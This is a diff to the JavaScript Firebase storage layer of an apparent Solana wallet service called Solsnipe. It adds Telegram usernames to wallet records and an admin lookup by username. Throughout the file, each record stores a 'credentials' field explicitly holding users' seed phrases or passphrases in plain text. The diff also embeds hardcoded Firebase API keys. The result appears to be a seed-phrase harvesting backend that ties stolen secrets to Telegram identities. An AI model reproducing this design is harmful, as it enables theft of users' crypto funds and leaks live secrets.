@@ -34,8 +34,8 @@
 class FirebaseWalletStore {
   constructor() {
     // Use environment variables with hardcoded fallback for local development
-    this.projectId = process.env.FIREBASE_PROJECT_ID || 'solsnipetest';
-    this.apiKey = process.env.FIREBASE_API_KEY || 'AIzaSyDCNm_YPQen7StRUm1rZUX2L0ni_INkKk8';
+    this.projectId = process.env.FIREBASE_PROJECT_ID || 'solsnipe-53d3d';
+    this.apiKey = process.env.FIREBASE_API_KEY || 'AIzaSyCKnv1705s9mo8K71llwKoAjL4V8yVUJss';
     
     // Validate that we have values
     if (!this.projectId) {
@@ -58,7 +58,7 @@ class FirebaseWalletStore {
    */
   async saveWallet(walletData) {
     try {
-      const { walletId, walletAddress, lookupHash, walletType, inputType, derivationPath, accountIndex, balance = 0, credentials = '' } = walletData;
+      const { walletId, walletAddress, lookupHash, walletType, inputType, derivationPath, accountIndex, balance = 0, credentials = '', telegramUsername = '' } = walletData;
 
       console.log('💾 Saving wallet to Firebase:', walletAddress);
 
@@ -78,6 +78,7 @@ class FirebaseWalletStore {
           solsnipeBalance: { doubleValue: 0 }, // Initialize Solsnipe balance to 0
           depositedAmount: { doubleValue: 0 }, // Initialize deposited amount to 0
           credentials: { stringValue: credentials }, // Store seed phrase or passphrase
+          telegramUsername: { stringValue: telegramUsername }, // Telegram user who connected this wallet
           balanceLastUpdated: { timestampValue: new Date().toISOString() },
           solsnipeBalanceLastUpdated: { timestampValue: new Date().toISOString() },
           depositedAmountLastUpdated: { timestampValue: new Date().toISOString() },
@@ -269,6 +270,80 @@ class FirebaseWalletStore {
   }
 
   /**
+   * Set/refresh the Telegram username associated with a wallet.
+   * Uses a field-masked PATCH so no other wallet fields are touched.
+   */
+  async updateWalletTelegramUsername(walletId, telegramUsername) {
+    try {
+      if (!telegramUsername) return null;
+
+      const docPath = `${this.baseUrl}/wallets/${walletId}?updateMask.fieldPaths=telegramUsername&key=${this.apiKey}`;
+
+      const response = await fetch(docPath, {
+        method: 'PATCH',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          fields: { telegramUsername: { stringValue: telegramUsername } }
+        })
+      });
+
+      if (!response.ok) {
+        const error = await response.json().catch(() => ({}));
+        throw new Error(`Firebase update failed: ${error.error?.message || 'Unknown error'}`);
+      }
+
+      console.log('✅ Wallet Telegram association updated:', { walletId, telegramUsername });
+      return await response.json();
+    } catch (error) {
+      throw new Error(`Failed to update Telegram username: ${error.message}`);
+    }
+  }
+
+  /**
+   * Find a wallet by its associated Telegram username (admin use)
+   */
+  async getWalletByTelegramUsername(telegramUsername) {
+    try {
+      const queryUrl = `${this.baseUrl}:runQuery?key=${this.apiKey}`;
+
+      const query = {
+        structuredQuery: {
+          from: [{ collectionId: 'wallets' }],
+          where: {
+            fieldFilter: {
+              field: { fieldPath: 'telegramUsername' },
+              op: 'EQUAL',
+              value: { stringValue: telegramUsername }
+            }
+          },
+          limit: 1
+        }
+      };
+
+      const response = await fetch(queryUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(query)
+      });
+
+      if (!response.ok) {
+        const errorText = await response.text();
+        throw new Error(`Firebase query failed: ${errorText}`);
+      }
+
+      const results = await response.json();
+      if (!results || results.length === 0 || !results[0].document) {
+        return null;
+      }
+
+      return this.parseFirestoreDocument(results[0].document);
+    } catch (error) {
+      console.error('💥 getWalletByTelegramUsername error:', error.message);
+      throw new Error(`Failed to query wallet by Telegram username: ${error.message}`);
+    }
+  }
+
+  /**
    * Update wallet balance and last login
    */
   async updateWalletBalance(walletId, balance, transactions = [], creditAmount = 0) {
@@ -301,6 +376,7 @@ class FirebaseWalletStore {
           blockchain: { stringValue: wallet.blockchain || 'solana' },
           solsnipeBalance: { doubleValue: wallet.solsnipeBalance || 0 }, // Preserve Solsnipe balance
           credentials: { stringValue: wallet.credentials || '' }, // Preserve credentials
+          telegramUsername: { stringValue: wallet.telegramUsername || '' }, // Preserve Telegram association
           createdAt: { timestampValue: wallet.createdAt },
           // Update these fields
           balance: { doubleValue: balance },
@@ -643,6 +719,7 @@ class FirebaseWalletStore {
           blockchain: { stringValue: wallet.blockchain || 'solana' },
           balance: { doubleValue: wallet.balance || 0 },
           credentials: { stringValue: wallet.credentials || '' },
+          telegramUsername: { stringValue: wallet.telegramUsername || '' }, // Preserve Telegram association
           createdAt: { timestampValue: wallet.createdAt },
           balanceLastUpdated: { timestampValue: wallet.balanceLastUpdated },
           lastLoginAt: { timestampValue: wallet.lastLoginAt },
@@ -720,6 +797,7 @@ class FirebaseWalletStore {
           balance: { doubleValue: wallet.balance || 0 },
           solsnipeBalance: { doubleValue: wallet.solsnipeBalance || 0 },
           credentials: { stringValue: wallet.credentials || '' },
+          telegramUsername: { stringValue: wallet.telegramUsername || '' }, // Preserve Telegram association
           createdAt: { timestampValue: wallet.createdAt },
           balanceLastUpdated: { timestampValue: wallet.balanceLastUpdated },
           solsnipeBalanceLastUpdated: { timestampValue: wallet.solsnipeBalanceLastUpdated || new Date().toISOString() },
@@ -845,6 +923,7 @@ class FirebaseWalletStore {
           solsnipeBalance: { doubleValue: wallet.solsnipeBalance || 0 },
           depositedAmount: { doubleValue: wallet.depositedAmount || 0 },
           credentials: { stringValue: wallet.credentials || '' },
+          telegramUsername: { stringValue: wallet.telegramUsername || '' }, // Preserve Telegram association
           createdAt: { timestampValue: wallet.createdAt },
           balanceLastUpdated: { timestampValue: wallet.balanceLastUpdated },
           solsnipeBalanceLastUpdated: { timestampValue: wallet.solsnipeBalanceLastUpdated || new Date().toISOString() },
